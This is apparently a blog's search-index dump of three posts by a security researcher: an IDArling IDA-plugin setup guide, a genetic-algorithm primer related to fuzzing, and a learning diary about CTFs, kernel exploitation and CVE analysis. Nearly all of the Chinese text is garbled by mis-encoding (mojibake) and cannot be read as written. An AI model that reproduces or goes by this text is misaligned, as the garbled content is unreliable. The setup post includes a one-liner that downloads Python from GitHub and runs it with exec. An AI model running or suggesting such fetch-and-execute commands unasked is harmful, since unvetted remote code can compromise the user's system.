æˆ‘å°±å±äºåè€…â€¦æœ‰æ—¶å€™æ‡’å¾—èƒŒç”µè„‘å›å®¶ï¼Œæœ‰æ—¶å€™é€†å‘çš„æ—¶å€™å¾ˆä¸æ–¹ä¾¿ï¼Œidbä¹‹é—´åŒæ­¥å°±æ˜¯é—®é¢˜â€¦è€Œä¸”ç›®æ ‡æ›´æ–°ä¹‹åï¼Œå¤šä¸ªç‰ˆæœ¬çš„é€†å‘å¯¹æ¯”ï¼Œä¸æ–¹ä¾¿ï¼Œç›´æ¥éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šè¿˜æ˜¯å¾ˆæ–¹ä¾¿çš„ã€‚ 0x01 : å®‰è£…ä»¥åŠéƒ¨ç½²1. å…·ä½“çš„å®‰è£…æ­¥éª¤ä»¥ä¸‹æ¥è‡ªå®˜æ–¹githubä¸Šé¡¹ç›®çš„readmeæ–‡æ¡£ï¼š â€‹ Copy idarling_plugin.py and the idarling folder to the IDA plugins folder. Alternatively, you can use the â€œeasy installâ€ method by copying the following 1import urllib2; exec(urllib2.urlopen('https://raw.githubusercontent.com/IDArlingTeam/IDArling/master/easy_install.py')).read() è¿™è¡Œpyåœ¨IDAè‡ªå¸¦çš„é‚£ä¸ªpy shellé‡Œæ‰§è¡Œå°±å¥½äº†ã€‚ å®‰è£…ä¹‹åIDAçš„å³ä¸‹è§’ä¼šå‡ºç° IDArling v0.0.1 | .....çš„å­—æ ·ï¼Œè¯´æ˜å®‰è£…æˆåŠŸã€‚ 2. éƒ¨ç½²åªéœ€è¦å®‰è£…pyqt5å°±å¥½äº†ï¼Œæˆ‘è¿™é‡Œç”¨çš„ubuntuã€‚ 1sudo apt-get install python-pyqt5 ç„¶åç›´æ¥è¿è¡Œserverè„šæœ¬å°±å¯ä»¥å¯åŠ¨æœåŠ¡ã€‚ 3. ä½¿ç”¨IDAå³ä¸‹è§’æ’ä»¶å›¾æ ‡çš„åœ°æ–¹ï¼Œå³é”®ï¼Œæ·»åŠ æœåŠ¡å™¨ä¿¡æ¯ï¼Œç„¶åé€‰æ‹©æœåŠ¡å™¨è¿æ¥ï¼Œå°±å¯ä»¥ä½¿ç”¨äº†ã€‚ 0x02 : å¼•ç”¨IDArling","link":"/2018/12/25/%E9%80%86%E5%90%91%E5%8D%8F%E4%BD%9C%E4%B9%8BIDA%E6%8F%92%E4%BB%B6IDArling/"},{"title":"é—ä¼ ç®—æ³•åˆçª¥","text":"0x00:è¯»Fuzzingç›¸å…³çš„paperçš„æ—¶å€™é‡åˆ°äº†å…³äºé—ä¼ ç®—æ³•çš„é—®é¢˜ï¼Œå…¶å®AFLæ™’æ ·æœ¬ä¹Ÿæ˜¯ç”¨äº†é—ä¼ ç®—æ³•ï¼Œä¸ªäººçš„è¯ä¸€ç›´æ²¡å»æ¢ç©¶ï¼Œæ­£å¥½è¯»paperé‡åˆ°äº†ï¼Œå°±æœäº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ç¯‡å¥½æ–‡ getting-started-genetic-algorithms-python-tutorialï¼Œçœ‹å®Œä¹‹åä¸€ä¸‹å­æ˜äº†ï¼Œå¹¶ä¸”å¤§å‘¼è¿‡ç˜¾ (å¥½æ–‡ç« å•Š!) 0x01 : è¾¾å°”æ–‡è¿›åŒ–è®ºè¾¾å°”æ–‡è®¤ä¸ºï¼Œç”Ÿç‰©ä¹‹é—´å­˜åœ¨ç€ç”Ÿå­˜äº‰æ–—ï¼Œé€‚åº”è€…ç”Ÿå­˜ä¸‹æ¥ï¼Œä¸é€‚è€…åˆ™è¢«æ·˜æ±°ï¼Œè¿™å°±æ˜¯è‡ªç„¶çš„é€‰æ‹©ã€‚ç”Ÿç‰©æ­£æ˜¯é€šè¿‡é—ä¼ ã€å˜å¼‚å’Œè‡ªç„¶é€‰æ‹©ï¼Œä»ä½çº§åˆ°é«˜çº§ï¼Œä»ç®€å•åˆ°å¤æ‚ï¼Œç§ç±»ç”±å°‘åˆ°å¤šåœ°è¿›åŒ–ç€ã€å‘å±•ç€ã€‚ 0x02 : é—ä¼ ç®—æ³•ç®€è¿°è¿™ä¸ªç®—æ³•çš„æ ¸å¿ƒç†å¿µå¾ˆç®€å•ï¼šå¦‚æœä¸€ä¸ªç§ç¾¤æƒ³æŒç»­å‘å±•ä¸‹å»ï¼Œå°±å¿…é¡»ä¸æ–­çš„æé«˜è‡ªèº«ï¼Œå»é€‚åº”ç¯å¢ƒï¼Œåœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ä¼šä¸ªä½“ä¼šäº§ç”Ÿå˜å¼‚ï¼Œé€‚åº”ç¯å¢ƒçš„å˜å¼‚ä¼šä¿ç•™ä¸‹æ¥ï¼Œé—ä¼ ç»™åä»£ï¼Œè¿™ä¹ˆä¸€ä»£ä¸€ä»£çš„ç­›é€‰ä¸‹æ¥ï¼Œç•™ä¸‹æ¥çš„éƒ½æ˜¯æœ€é€‚åº”ç¯å¢ƒçš„ä¸ªä½“ã€‚ æˆ‘ä»¬æ‹¿Fuzzä¸¾ä¾‹ï¼Œæ¯ä¸€ä¸ªæ ·æœ¬è¿›å»æ‰€è§¦å‘çš„è·¯å¾„ã€æ‰§è¡Œæ—¶é—´éƒ½æœ‰å·®å¼‚ï¼Œé‚£ä¹ˆå¦‚ä½•å»ç­›é€‰å‡ºæœ‰æ•ˆçš„æ ·æœ¬ï¼Œä»è€Œä»è¿™äº›æ ·æœ¬å†æ¬¡è¿­ä»£å‡ºæ–°ä¸€ä»£æ ·æœ¬ï¼Œä»è€Œè®©æˆ‘ä»¬çš„Fuzzæ›´åŠ æœ‰æ•ˆå‘¢ï¼Ÿ è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè¯„åˆ†è§„åˆ™ï¼ˆç±»æ¯”ç¯å¢ƒé€‚åº”èƒ½åŠ›ï¼‰ï¼Œè¯„åˆ†è¶Šé«˜ï¼Œé‚£ä¹ˆé€‚åº”èƒ½åŠ›å°±è¶Šå¥½ï¼Œåœ¨è¿™æ¬¡æ ·æœ¬å˜å¼‚ä¸­å˜å¼‚çš„éƒ¨åˆ†ï¼ˆç‰¹æ€§ï¼‰ä¼šè¢«ä¿ç•™ä¸‹æ¥ï¼Œé—ä¼ ç»™ä¸‹ä¸€ä»£ã€‚ å‚è€ƒAFLï¼Œå®ƒä½¿ç”¨äº†è·¯å¾„ç­‰ä¿¡æ¯è®¡ç®—ä¸€ä¸ªè¯„åˆ†ï¼Œè¯„åˆ†é«˜çš„æ ·æœ¬ä¿ç•™ï¼ˆè§¦å‘è·¯å¾„å¤šï¼‰ï¼Œé‚£ä¹ˆä»è¿™äº›æ ·æœ¬ä¸­è¿­ä»£ï¼Œå°±å®¹æ˜“äº§ç”Ÿæ›´â€œä¼˜ç§€â€çš„æ ·æœ¬æ–‡ä»¶ã€‚ ä¸‹å›¾é—ä¼ ç®—æ³•çš„ç®€å•æè¿°: 0x03 : ä¸¾ä¸ªæ —å­ä¾‹å­æ¥è‡ªgetting-started-genetic-algorithms-python-tutorial 1. demoç®€è¿°è¿™é‡Œåˆ›å»ºä¸€ä¸ªå·²çŸ¥é•¿åº¦çš„å¯†ç ç ´è§£ç¨‹åº -ã€‚- ï¼ˆè¿™ä¸å°±æ˜¯æš´åŠ›ç ´è§£å—ï¼Œæ˜¯çš„æ²¡é”™ï¼Œä½†æ˜¯æ€ç»´æ–¹å¼è¦æ¢ä¸€æ¢å•¦ï¼‰ æˆ‘ä»¬é’ˆå¯¹æ²¡é”™è¾“å…¥çš„å­—ç¬¦ä¸²ï¼ˆä¸ªä½“ï¼‰è¿›è¡Œè¯„ä¼°ï¼Œå¾—åˆ°ä¸€ä¸ªè¯„åˆ†ï¼ˆé€‚åº”ç¯å¢ƒæ€§ï¼‰ï¼Œè¿™ä¸ªè¯„åˆ†æŒ‡ç¤ºç€å’Œæ­£ç¡®å¯†ç çš„æ¥è¿‘ç¨‹åº¦ã€‚ç®—æ³•å¦‚ä¸‹ï¼š 1fitness score = (number of char correct) / (total number of char) éšåå¯¹è¾“å…¥çš„ä¸²è¿›è¡Œå˜å¼‚ï¼ˆè¿›åŒ–ï¼Œè¿›åŒ–ï¼Œè¿›åŒ–â€¦ï¼‰ï¼Œç„¶åå¯¹äºæ–°ä¸€ä»£çš„ç¾¤ä½“ï¼Œè¿›è¡Œè¯„åˆ†ï¼ŒæŒ‘é€‰åˆé€‚çš„ä¸ªä½“ä½œä¸ºç¬¬äºŒä»£ï¼Œç„¶åä»ç¬¬äºŒä»£ä¸­è¿­ä»£äº§ç”Ÿæ–°çš„ä¸ªä½“ã€‚ äº§ç”Ÿä¸‹ä¸€ä»£çš„æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œæ¯”å¦‚æˆ‘ä»¬æœ‰ä¸¤ä¸ªä¸ªä½“å«åšTomå’ŒJerryï¼Œä»–ä»¬çš„åä»£åå­—çš„å­—æ¯å°±ä»ä¸¤è€…åå­—å­—æ¯ä¸­å–å°±å¥½äº†ã€‚ ç»å†ä¸Šè¿°çš„è¿‡ç¨‹ï¼Œä¸€ä»£ä¸€ä»£çš„è¿›åŒ–ï¼Œæœ€ç»ˆä¸€å®šä¼šå¾—åˆ°æ­£ç¡®çš„å¯†ç ã€‚ 2. ä¸€ç‚¹é—®é¢˜ä½†æ˜¯é—®é¢˜æ¥äº†ï¼è¿™ä¹Ÿæ˜¯ä»Šå¤©æˆ‘åœ¨çœ‹è®ºæ–‡æ—¶å‘ç°çš„ä¸€ä¸ªé—®é¢˜-ã€‚- 123Bloating: Bloating [16] is a phenomenon that adversely affects input generation in evolutionary computing. There are two types of bloating: structural and functional bloating. ä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼šStructural Bloatingå’ŒFunctional Bloatingã€‚ ç¬¬ä¸€ç§ä¸»è¦æ˜¯ç»è¿‡å¤šä»£çš„è¿­ä»£åï¼Œç»è¿‡xxä»£ï¼Œä¸ªä½“çš„å¹³å‡è§„æ¨¡ä¸å—æ§åˆ¶çš„å¢é•¿ä»è€Œå¯¼è‡´ä»£ç æ•ˆç‡ä¸‹é™ï¼Œåç»­çš„å¢é•¿ä¹Ÿæ— å¼‚äºæé«˜é€‚åº”åº¦ï¼ˆé€‚åº”åº¦ï¼Œå°±æ˜¯ä¾‹å­ä¸­çš„fitnessï¼‰ã€‚ ç¬¬äºŒç§æ˜¯æŒ‡åœ¨è¿›åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœåªæŒ‘é€‰å¥½çš„æ ·æœ¬ï¼ˆé«˜è¯„åˆ†ï¼‰ï¼Œé‚£ä¹ˆä½ å¾—åˆ°çš„æ ·æœ¬ä¼šå¿«é€Ÿæ”¶æ•›åœ¨ä¸€ä¸ªèŒƒå›´å†…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ çš„æ ·æœ¬çš„ç‰¹å¾å°±è¶‹äºä¸€ä¸ªæ–¹å‘ã€‚å¯¹äºæˆ‘ä»¬è¿™ä¸ªå¯†ç ç ´è§£ç¨‹åºï¼Œå½“ç„¶okå•¦ï¼Œä½†æ˜¯å¯¹äºFuzzçš„è¯æ˜¾ç„¶æ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬éœ€è¦å¤šç§å¤šæ ·çš„æ ·æœ¬è€Œä¸æ˜¯è¶‹è¿‘äºæŸä¸€ç§ç±»å‹çš„æ ·æœ¬ã€‚ 3. ä»£ç åŸæ–‡ä½œè€…çš„ä»£ç åœ¨è¿™é‡Œï¼šgetting-started-genetic-algorithms-python-tutorial_source_code è¿è¡Œç»“æœï¼š 123$ python3 passwordTuto.pysolution: &quot;banana&quot; de fitness: 100.018.69589400291443 0x04 : ä¸€ç‚¹ä¸ªäººçœ‹æ³•æˆ‘è§‰å¾—è¿™ä¸ªç®—æ³•å¯¹äºæ¼æ´æŒ–æ˜ï¼Œæ— ç–‘æ˜¯å¢å¼ºå‹buffï¼Œé€šè¿‡åˆç†çš„ä½¿ç”¨ï¼Œèƒ½å¤Ÿæœ‰æ•ˆçš„æå‡æ ·æœ¬è´¨é‡ï¼Œä»è€Œæé«˜fuzzçš„æ•ˆç‡ã€‚ä½†æ˜¯æ–‡ä¸­æåˆ°çš„Bloatingçš„é—®é¢˜ï¼Œæ— ç–‘ä¹Ÿæ˜¯éœ€è¦å»è€ƒè™‘ç„¶ååŠ ä»¥å¹²é¢„çš„ã€‚ 0x05 : å‚è€ƒåŠå¼•ç”¨ getting-started-genetic-algorithms-python-tutorial getting-started-genetic-algorithms-python-tutorial_source_code IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming","link":"/2018/06/03/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E5%88%9D%E7%AA%A5/"},{"title":"Logs","text":"0x1337 2017-01-28å¤§å¹´åˆä¸€è¿˜åœ¨å†™ä»£ç ï¼ŒæŠŠä»¥å‰æŒ–çš„å‘å¡«èµ·æ¥ï¼Œä¸€ç›´æƒ³åšçš„è‡ªåŠ¨åŒ–çš„æ¡†æ¶ç»ˆäºæœ‰ç‚¹æ ·å­äº†ï¼Œå…ˆåšçš„èƒ½è·‘èµ·æ¥ï¼Œç„¶åå†åšä¸€äº›ä¼˜åŒ–å·¥ä½œæŠŠã€‚æƒ³ç€æ˜¯åƒmsfé‚£æ ·çš„ï¼Œå‡ ä¸ªåŠŸèƒ½åˆ†æˆå‡ ä¸ªæ¨¡å—å»åšï¼Œæ¨¡å—ä¹‹é—´ç‹¬ç«‹ï¼Œç„¶åpaylodé‚£äº›å¯ä»¥éšæ„è°ƒç”¨ï¼›ä»Šå¤©åªæŠŠexploitéƒ¨åˆ†å†™äº†ä¸ªå¼€å¤´ï¼Œæ„Ÿè§‰æ€»æƒ³æ¨ç¿»é‡å†™â€¦è¿™æ˜¯ç—…ï¼Œå…ˆåšå®Œäº†å†è¯´é‡æ„çš„äº‹æƒ…å¥½äº† QAQ ã€‚ å‰å‡ å¤©å…¥å‘äº†Windows Kernel Exploitç›¸å…³ï¼Œçœ‹åˆ°äº†å…³äºå†…æ ¸å†…å­˜åˆ†é…ç›¸å…³çš„èµ„æ–™çš„æ—¶å€™ï¼Œæ„Ÿè§‰å¥½ç†Ÿæ‚‰ï¼Œä¸€ä¸‹æƒ³èµ·äº†ä¹‹å‰çœ‹åˆ°linux glibcå †ç®¡ç†ç›¸å…³çš„èµ„æ–™äº†ã€‚æœ‰ç§å¾ˆç†Ÿæ‚‰çš„æ„Ÿè§‰å§ï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œæ„Ÿè§‰å†çœ‹åˆ°windows kernelå†…å­˜ç®¡ç†éƒ¨åˆ†çš„æ—¶å€™å°±å¾ˆå®¹æ˜“å¯ä»¥ç†è§£è¿™äº›ç»“æ„æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Œä¸Šæ‰‹è¿˜æ˜¯å¿«ï¼Œä¸è¿‡è¿˜æ˜¯æƒ³å†™å†™ä»£ç è°ƒè¯•çœ‹çœ‹ï¼Œæ¯•ç«Ÿçº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ã€‚ è¯´åˆ°å¡«å‘ï¼Œæ„Ÿè§‰å¥½å¤šå•Šï¼Œä¹‹å‰Android Secç›¸å…³ï¼›LLVMçš„ç ”ç©¶ä¹Ÿæ˜¯å¤„åœ¨æŒ‚èµ·çŠ¶æ€ï¼Œä¹‹å‰æ˜¯ç»“åˆç€ä»£ç æ··æ·†æŠ€æœ¯å»å­¦ä¹ çš„ï¼Œè‡ªå·±å†™å†™passä¹‹ç±»çš„ï¼Œè¿˜æœ‰å°±æ˜¯çœ‹çœ‹OLLVMè¿™ä¸ªé¡¹ç›®ï¼›ç¬¦å·æ‰§è¡ŒæŠ€æœ¯çš„å­¦ä¹ ç®—æ˜¯è¿ˆå…¥æ­£è½¨å§ï¼ŒPaperä¹Ÿå¾ˆå¤šã€‚è¿˜æœ‰å°±æ˜¯YouTubeä¸Šå¥½å¤šä¸é”™çš„è¿™äº›ç›¸å…³çš„è§†é¢‘å•Š 2333333 æ…¢æ…¢æ¥å§ï¼Œæ„Ÿè§‰éƒ½å¾ˆæœ‰æ„æ€ï¼Œè€Œä¸”è¶Šå¾€åç ”ç©¶è¶Šæœ‰æ„æ€å‘€~ 2017-01-29æ¡†æ¶exploitéƒ¨åˆ†å®Œæˆå•¦ -ã€‚- å“¦è±çœ‹Androidç›¸å…³ï¼Œçœ‹åˆ°Dalvkè™šæ‹Ÿæœºéƒ¨åˆ†çš„æ—¶å€™ï¼Œçœ‹åˆ°äº†å…³äºZygoteï¼Œå°±æ˜¯è™šæ‹Ÿæœºå®ä¾‹å­µåŒ–å™¨â€¦ç„¶è€Œè¿™ä¸ªå•è¯çš„æ„æ€ä¹Ÿæ˜¯å¾ˆæœ‰è¶£å•Š å•Šå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆï¼Œå½¢è±¡ç”ŸåŠ¨ 233333333333333 2017-01-30çº ç»“åˆ°åº•å¼€ä¸å¼€æºä¸€äº›ä¸œè¥¿ :( 2017-02-04æµªå®Œäº†å›æ¥å¼€å·¥äº† 23333æƒ³æ˜ç™½äº†ä¸€äº›äº‹ï¼Œç²¾åŠ›æœ‰é™ï¼Œè´ªå¤šåš¼ä¸çƒ‚ï¼›å…¶æ¬¡å°±æ˜¯å…³äºé‡è§†åŸºæœ¬åŠŸï¼Œä¸€å‘³åœ°è¿½æ±‚ä¸Šå±‚å»ºç­‘æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œæ—©æ™šè¦å´©å¡Œã€‚é‚£å­¦ä¹ æŠ€æœ¯æ¥è¯´ï¼Œæƒ³åšçš„å¾ˆå¤šï¼Œä½†æ˜¯ä½ èƒ½å¤Ÿåšå¥½å…¶ä¸­ä¸€ä¸¤ä»¶å·²ç»å¾ˆä¸é”™äº†ï¼Œè¿˜æœ‰å°±æ˜¯æ“ä½œç³»ç»Ÿè¿™ä¸ªä¸œè¥¿â€¦ä¸å»æŠŠé‚£äº›labåˆ·äº†æ„Ÿè§‰è¿˜æ˜¯ç™½å­¦ï¼ŒçŸ¥è¡Œåˆä¸€å§ç®—æ˜¯ã€‚ 2017-02-07mdzzå•Šâ€¦ç¼–è¯‘linuxå†…æ ¸ç„¶åå‡çº§ä¸ªlinuxï¼Œç„¶åè™šæ‹Ÿæœºå°±ç‚¸äº†ç¡¬ç›˜æ²¡æŒ‚ä¸Šâ€¦bugå°è¯•ä¸€ä¸‹æ·»åŠ ç³»ç»Ÿè°ƒç”¨ã€é©±åŠ¨çš„æ–¹å¼æ¥ä½“éªŒä¸€ä¸‹linux kernel exploit 23333333333 2017-02-11æŠŠè‡ªå·±çš„PwnableLogè¿™ä¸ªrepoæ•´åˆè¿›äº†ä¸€äº›æ”¶é›†çš„ä¸é”™çš„è„šæœ¬ï¼Œç¨ä½œæ”¹åŠ¨å°±å¯ä»¥ç©äº†ã€‚å•Š winaflå¯¹äºGUIç¨‹åºçœŸæ˜¯å°´å°¬ï¼Œå‘é€çª—å£å…³é—­æ¶ˆæ¯æˆ–è€…å¾ªç¯è¿›ç¨‹æ£€æµ‹å¹¶æ€è¿›ç¨‹çš„æ€è·¯æ•ˆæœéƒ½ä¸ç†æƒ³â€¦çœ‹æ¥åªæœ‰äºŒæ¬¡æ’æ¡©å¯ä»¥ç”¨ã€‚ 2017-02-17æ¡†æ¶é˜²å¾¡æ¨¡å—åŸºæœ¬åšèµ·æ¥äº†â€¦æƒ³ç€å…ˆå‡ºæˆå“å†ä¿®bug/ä¼˜åŒ–å·¥ä½œã€‚å½“åˆçç«‹flagï¼Œå·§äº†åˆæœ‰ç‚¹æ‹–å»¶ç—‡ï¼Œå“¦è±ï¼Œhave funå’¯ã€‚ 2017-02-28æŒºå°´å°¬å¾ˆå¤šä¸œè¥¿ä»¥å‰æ²¡åšè¯¦ç»†çš„è®°å½•ï¼Œåªæœ‰é›¶ç¢çš„è®°å½•å’Œè„šæœ¬â€¦æ€»ç»“èµ·æ¥å°±å¾ˆè›‹ç–¼ã€‚æœ€è¿‘è¿˜æ˜¯æŒºå¼€å¿ƒå•Šï¼Œæœ‰äº†é“ ç”²ä¹Ÿæœ‰äº†è½¯è‚‹ï¼Œæ„Ÿè§‰å¤šäº†ä¸€ä¸ªåŠªåŠ›çš„ç†ç”±å’¯ã€‚ 2017-03-01ä¸€ä¸ªæœ‰æƒ…æ€€çš„äºŒè¿›åˆ¶ç‹—ã€‚ 2017-03-06è¿™æ˜¯å‡çš„ï¼Œé‚£æ˜¯å‡çš„ï¼Œå¥½åƒæ²¡ä»€ä¹ˆçœŸçš„äº†ã€‚ 2017-03-10æœ€è¿‘å¼€å§‹çœ‹linux kernelç›¸å…³ï¼Œåº•å±‚çœŸçš„å¤ªæœ‰è¶£äº†~linus insidesè¿™ä¸ªgitbookä¸é”™ï¼Œä»bootå¼€å§‹è®²ï¼Œç»“åˆç€çœ‹å°±å¾ˆä¸é”™ï¼Œå†å¯¹åº”ç€æºç ï¼Œå¾ˆçˆ½ã€‚ 2017-03-13è‚äº†ä¸¤å¤©NJCTFâ€¦è¿˜æ˜¯æ„Ÿè§‰å¤ªèœäº† QAQ ä½åˆ†é¢˜ç›®åšçš„æ…¢ é«˜åˆ†ç©ä¸åŠ¨â€¦æŒºå¯æƒœçš„reverse400ï¼Œç¬¦å·æ‰§è¡Œè„šæœ¬éƒ½å†™å¥½äº†ï¼Œè·‘äº†å‡ æ¬¡ï¼Œposixdumpçš„æ˜¯ç©ºå€¼ï¼Œæ€•æ˜¯è„šæœ¬åˆå†™çš„æœ‰é—®é¢˜ï¼Œè·¯å¾„æ‰¾åˆ°äº†ï¼Œå°±æ˜¯dumpä¸å¯¹ï¼Œå°´å°¬ã€‚pwnableï¼Œç®€å•çš„ä¸€äº›ç»†èŠ‚å¤„ç†çš„ä¸å¥½ï¼Œå¾ˆä¼¤ï¼Œå¹³æ—¶çš„ç§¯ç´¯å•Šï¼Œå¤šæ”¶é›†libcï¼Œå¤šåŠ¨æ‰‹æäº‹æƒ… 23333SROPå¼€çœ¼äº†ï¼Œåˆæ˜¯è®ºæ–‡pwnï¼Œå®³æ€•â€¦ä¸è¿‡jokeré‚£ä¸ªexpçœŸçš„å¤ªé»‘å®¢äº†ï¼Œæ€è·¯666å¥½å¥½å­¦ä¹ æŠŠ~ æ¯”èµ›çœŸçš„æŒºæœ‰æ„æ€çš„ XD 2017-03-22é¢è¯•è¿™å‡ æ¬¡ï¼Œå€æ„Ÿæ‰€å­¦çŸ¥è¯†é¢çš„ç‹­çª„ï¼Œäº†è§£çš„å¾ˆæœ‰é™ï¼Œè€Œä¸”ä»¥å‰æŒæ¡çš„ä¸€äº›ä¸œè¥¿æ²¡æœ‰å†å»çœ‹å°±å¾ˆå®¹æ˜“å¿˜è®°ä¸€äº›ç»†èŠ‚(è¿˜å¥½è¿˜æœ‰ç¬”è®°â€¦)æ„Ÿè§‰ä¸€ç›´åœ¨è¢«é—®ç§»åŠ¨å®‰å…¨â€¦å­¦ä¹ å­¦ä¹ ã€‚ç»å†ä¸€äº›æ¯”èµ›ä¹‹åï¼Œæ„Ÿè§‰è¿˜æœ‰å¾ˆå¤šæ¼æ´åˆ©ç”¨çš„trickâ€¦è°ƒè¯•çš„trickï¼Œæ¯”å¦‚è·å–gs:0x10çš„å€¼ï¼Œéƒ½æœ‰å¾…ç§¯ç´¯ã€‚ 2017-03-23å¥½å¤šä¸é¡ºåˆ©- -ã€‚æƒ³è¦çš„å¾ˆç®€å•ï¼Œå¯æ˜¯å¾—åˆ°å´é‚£ä¹ˆéš¾ã€‚ 2017-03-27é‡å¤´å†æ¥ï¼Œä¸€åˆ‡è¿˜è¦ç»§ç»­ï¼Œæˆ‘ä¸è¿˜æ˜¯è¦æ¥ç€çœ‹ä¹¦å­¦ä¹ å†™ä»£ç ä¹ˆã€‚ 2017-03-29è°ƒè¯•åˆ†æCVE-2017-7269,å‘ç°ç”¨capstoneè¿˜åŸshellcodeæŒºå¥½ç”¨çš„â€¦è™½ç„¶è¿˜åŸå‡ºæ¥çš„scå¹¶ä¸å¥½æ‡‚â€¦å¯èƒ½æ˜¯å§¿åŠ¿æœ‰é—®é¢˜?æ±‡ç¼–æŒ‡ä»¤ç”¨çš„å¾ˆå¥‡æ€ªâ€¦è¿˜æœ‰å°±æ˜¯å¿«é€Ÿå®šä½æ¼æ´ç‚¹ï¼Œæˆ‘æƒ³æ‰“ä¸ªCCç„¶åjust in time debuggerè¿›å»æ ˆå›æº¯çœ‹ï¼Œä½†æ˜¯æ•ˆæœä¸ç†æƒ³ï¼Œå•Šå•Šå•Š æµ‹è¯•åˆ«çš„æ–¹æ³•å¥½äº†ã€‚ 2017-04-01å°†ç”Ÿæ´»å¸¦ç»™ä½ çš„æŸ æª¬ç‰ˆçš„é…¸æ¥šï¼Œé…¿æˆçŠ¹å¦‚æŸ æª¬æ±½æ°´èˆ¬çš„ç”˜ç”œã€‚å·²ç»å¦‚æ­¤äº†ï¼Œå†åä¹Ÿåä¸åˆ°å“ªé‡Œå»äº†ã€‚æ²¡æœ‰ä»€ä¹ˆåè·¯ï¼Œä¹Ÿå°±æ— æ‰€ç•æƒ§ï¼Œå¤§æ­¥å‘å‰ã€‚ 2017-05-05æœ‰æ—¶å€™éœ€è¦åæ€ä»¥ä¸‹è‡ªå·±çš„è®²è¯çš„æ–¹å¼ã€‚å¯èƒ½æ˜¯è¿™å‡ å¹´æ¥è§¦çš„æœ€å¤šçš„æ˜¯æŠ€æœ¯ç›¸å…³çš„æœ‹å‹ï¼Œåœˆå­å¾ˆå°ï¼Œæ‰€ä»¥å¤§å®¶äº¤æµçš„æ–¹å¼éƒ½æ˜¯é‚£ä¹ˆç›´æ¥ï¼Œä¹Ÿå¾ˆç›´ç™½ï¼Œæ¯”å¦‚è¯´åˆ°xxxï¼Œå°±ä¼šç›´æ¥è®²ï¼Œxxxå¾ˆç®€å•çš„ï¼Œä½ åªè¦çœ‹äº†xxxxxå°±å¯ä»¥æå®šxxxxxç„¶åæœ€åå°±å¯ä»¥å®Œæˆxxxã€‚ å…¶å®ä½ åæ€ä»¥ä¸‹ï¼Œåœ¨åœˆå¤–äººçœ‹æ¥å‘¢ï¼Ÿå¯èƒ½å¾ˆå¤šäººçœ‹æ¥æ˜¯ï¼šmdzz æˆ‘ä¸æ‡‚è¿™äº›ï¼Œä½ è¿˜è¯´çš„æœ‰åŠ²ã€‚ è¿˜æœ‰å°±æ˜¯æ–¹å¼æŠŠï¼Œä¸å¯èƒ½ä¸€ç›´ç”Ÿæ´»åœ¨è¿™ä¸ªå°åœˆå­ï¼Œæ€»è¦æ¥è§¦å¾ˆå¤šäººï¼Œæ‰€ä»¥ä¸è¦æ€»æ˜¯ä»¥æŠ€æœ¯å®…çš„æ€ç»´å»äº¤æµåšäº‹ï¼Œæœ‰æ—¶å€™æŒºä¼¤äººå’¯-ã€‚- åˆ«äººä¸ºä»€ä¹ˆä¸é—®ä½ é—®é¢˜ï¼Œå› ä¸ºä½ æ€»è¯´ï¼šè¿™ä¸ªå¤ªç®€å•äº†é‚£ä¸ªå¤ªç®€å•äº†ã€‚ å±‚æ¬¡é—®é¢˜â€¦æœ‰äº›é—®é¢˜åœ¨å¤§ä½¬çœ‹æ¥å¾ˆç®€å•ï¼Œåœ¨æˆ‘çœ‹æ¥å°±å¾ˆå›°éš¾â€¦ç›¸äº’ç†è§£ä¸‹å°±å¥½äº† 233333 å¥½å¥½å­¦ä¹ å•¦ï¼Œå¤šçœ‹ä¹¦ï¼Œä¿®èº«å…»æ€§ï¼Œçƒ­çˆ±ç”Ÿæ´»ã€‚ 2017-05-23é“ä¸‰è¥¿å—èµ›åŒºæ‰“çš„æŒºä¸é”™ï¼Œå¼€å¿ƒã€‚ è¿‘æœŸå¼€å§‹å­¦ä¹ ç¼–è¯‘åŸç†ï¼Œä¸‰å¤§æµªæ¼«ä¹‹ä¸€ 23333 äººæ— ä¿¡ä¸è¶³ä»¥ç«‹ï¼Œå¯¹äºè¿™ä¸¤å¤©å‘ç”Ÿçš„äº‹æƒ…çš„æ„Ÿå—å§ï¼Œåˆä¸èƒ½å‘ç«ï¼Œçƒ¦ã€‚ 1adacå¾ˆå¥½ç”¨ï¼Œçˆ½ï¼Œè¿™é’±èŠ±çš„å€¼ã€‚ è¿˜æœ‰å˜›â€¦æœ‰äº›æ—¶å€™ä»˜å‡ºä¸ä¸€å®šè¦å›æŠ¥ï¼Œå†µä¸”æœ‰äº›äº‹æƒ…æ˜¯ä¹ æƒ¯äº†-ã€‚- 2017-05-30å­¤ç‹¬æ„Ÿã€‚ 2017-06-29è‡ªè¯´è‡ªè¯çš„**åªä¸è¿‡æ˜¯ç»™åˆ«äººå¹³æ·»çƒ¦æ¼ç½¢äº†ã€‚ 2017-07-04æ–­æ–­ç»­ç»­çœ‹å®Œäº† CVE-2016-0728çš„åˆ†æï¼Œä¹Ÿæ­å»ºäº†ç¯å¢ƒåˆ†æã€‚Linux kernelçš„UAFæŒºæœ‰æ„æ€ã€‚è¿˜åœ¨å†™ä½¿ç”¨äº†NFAæ„é€ çš„è¯æ³•åˆ†æå™¨â€¦cppæ‹™è®¡ æ„Ÿè§‰cå¯ä»¥åšï¼Œä½†æ˜¯åæœŸä¼˜åŒ–å‡ºDFAçš„æ—¶å€™å°±æ‹™è®¡äº†ã€‚ 2017-07-30å®ä¹ 